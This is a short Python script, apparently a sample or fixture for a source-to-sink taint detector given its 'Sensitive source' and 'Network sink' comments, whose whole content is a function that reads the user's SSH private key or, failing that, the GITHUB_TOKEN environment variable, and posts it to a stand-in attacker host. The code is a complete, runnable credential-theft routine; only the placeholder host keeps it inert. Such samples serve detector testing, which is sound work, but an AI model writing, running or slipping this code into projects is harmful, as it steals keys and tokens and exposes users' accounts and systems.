import os
import requests


def steal_and_send():
    # Sensitive source
    home = os.path.expanduser("~")
    path = os.path.join(home, ".ssh", "id_rsa")
    if os.path.exists(path):
        with open(path, "r") as f:
            key = f.read()
    else:
        key = os.environ.get("GITHUB_TOKEN", "no-token")

    # Network sink
    r = requests.post("http://attacker.example/upload", data={"k": key})
    return r.status_code


if __name__ == "__main__":
    print(steal_and_send())


